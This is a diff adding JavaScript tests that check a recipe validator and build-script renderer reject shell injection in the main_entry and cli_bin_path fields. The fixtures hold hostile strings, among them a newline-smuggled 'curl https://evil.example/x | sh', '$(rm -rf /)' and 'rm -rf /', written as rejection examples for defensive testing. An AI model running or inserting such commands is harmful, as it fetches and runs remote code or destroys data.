@@ -199,4 +199,56 @@ describe('fullsend evaluation: rejection cases', () => {
     assert.strictEqual(result.valid, false);
     assert.ok(result.errors.some(e => e.check === 'shell-metachar' || e.check === 'package-name-format'));
   });
+
+  it('rejects command injection via newline in main_entry', () => {
+    const fixture = loadFixture('valid-drafted-tier-a');
+    fixture.parameters.main_entry.value = 'index.js\ncurl https://evil.example/x | sh\n#';
+    const result = validateRecipeResult(fixture, SEMVER_FACTS);
+    assert.strictEqual(result.valid, false);
+    assert.ok(result.errors.some(e => e.check === 'unsafe-shell-path'));
+  });
+
+  it('rejects shell metacharacters in main_entry', () => {
+    const fixture = loadFixture('valid-drafted-tier-a');
+    fixture.parameters.main_entry.value = 'index.js; curl evil | sh';
+    const result = validateRecipeResult(fixture, SEMVER_FACTS);
+    assert.strictEqual(result.valid, false);
+    assert.ok(result.errors.some(e => e.check === 'unsafe-shell-path'));
+  });
+
+  it('rejects command substitution in cli_bin_path', () => {
+    const fixture = loadFixture('valid-drafted-tier-a');
+    fixture.parameters.cli_bin_path.value = 'bin/$(rm -rf /).js';
+    const result = validateRecipeResult(fixture, SEMVER_FACTS);
+    assert.strictEqual(result.valid, false);
+    assert.ok(result.errors.some(e => e.check === 'unsafe-shell-path'));
+  });
+
+  it('rejects a main_entry that diverges from upstream facts', () => {
+    const fixture = loadFixture('valid-drafted-tier-a');
+    fixture.parameters.main_entry.value = 'other.js';
+    const result = validateRecipeResult(fixture, SEMVER_FACTS);
+    assert.strictEqual(result.valid, false);
+    assert.ok(result.errors.some(e => e.check === 'main_entry-fact-match'));
+  });
+
+  it('blocks main_entry injection even without facts (deterministic post-step)', () => {
+    const fixture = loadFixture('valid-drafted-tier-a');
+    fixture.parameters.main_entry.value = 'index.js\nrm -rf /\n#';
+    const result = validateRecipeResult(fixture);
+    assert.strictEqual(result.valid, false);
+    assert.ok(result.errors.some(e => e.check === 'unsafe-shell-path'));
+  });
+
+  it('the injected payload never reaches a rendered build script', () => {
+    const tmp = mkdtempSync(join(tmpdir(), 'eval-inject-'));
+    mkdirSync(join(tmp, ALLOWED_BASE), { recursive: true });
+    try {
+      const fixture = loadFixture('valid-drafted-tier-a');
+      fixture.parameters.main_entry.value = 'index.js\ncurl https://evil.example/x | sh\n#';
+      assert.throws(() => render(fixture, tmp), RenderError);
+    } finally {
+      rmSync(tmp, { recursive: true, force: true });
+    }
+  });
 });
